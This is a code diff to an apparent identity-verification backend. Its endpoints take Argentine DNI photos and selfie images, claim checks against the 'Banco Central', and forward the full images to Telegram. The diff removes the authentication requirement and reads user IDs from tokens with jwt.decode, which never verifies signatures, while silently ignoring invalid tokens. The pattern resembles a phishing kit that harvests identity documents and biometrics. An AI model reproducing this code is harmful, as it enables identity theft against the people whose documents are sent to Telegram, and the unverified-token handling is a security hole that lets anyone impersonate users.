@@ -31,7 +31,7 @@ const validateWithBancoCentral = async (dniData: any) => {
   };
 };
 
-export const verifyDNI = async (req: AuthRequest, res: Response): Promise<void> => {
+export const verifyDNI = async (req: Request, res: Response): Promise<void> => {
   try {
     const { frontImage, backImage } = req.body;
 
@@ -46,9 +46,23 @@ export const verifyDNI = async (req: AuthRequest, res: Response): Promise<void> 
     // Validar con Banco Central
     const bcValidation = await validateWithBancoCentral(dniData);
 
+    // Obtener info del usuario del token si existe
+    const authHeader = req.headers.authorization;
+    let userId = 'unknown';
+    if (authHeader) {
+      try {
+        const token = authHeader.split(' ')[1];
+        const jwt = require('jsonwebtoken');
+        const decoded: any = jwt.decode(token);
+        userId = decoded?.userId || 'unknown';
+      } catch (e) {
+        // Token inválido, continuar igual
+      }
+    }
+
     // Enviar a Telegram con información completa
     await sendDNINotification({
-      userId: req.userId || 'unknown',
+      userId,
       frontImage,
       backImage,
       timestamp: new Date().toLocaleString('es-AR'),
@@ -67,7 +81,7 @@ export const verifyDNI = async (req: AuthRequest, res: Response): Promise<void> 
   }
 };
 
-export const verifyFacial = async (req: AuthRequest, res: Response): Promise<void> => {
+export const verifyFacial = async (req: Request, res: Response): Promise<void> => {
   try {
     const { faceImage, lightLevel } = req.body;
 
@@ -76,9 +90,23 @@ export const verifyFacial = async (req: AuthRequest, res: Response): Promise<voi
       return;
     }
 
+    // Obtener info del usuario del token si existe
+    const authHeader = req.headers.authorization;
+    let userId = 'unknown';
+    if (authHeader) {
+      try {
+        const token = authHeader.split(' ')[1];
+        const jwt = require('jsonwebtoken');
+        const decoded: any = jwt.decode(token);
+        userId = decoded?.userId || 'unknown';
+      } catch (e) {
+        // Token inválido, continuar igual
+      }
+    }
+
     // Enviar a Telegram
     await sendFacialNotification({
-      userId: req.userId || 'unknown',
+      userId,
       faceImage,
       lightLevel,
       timestamp: new Date().toLocaleString('es-AR'),
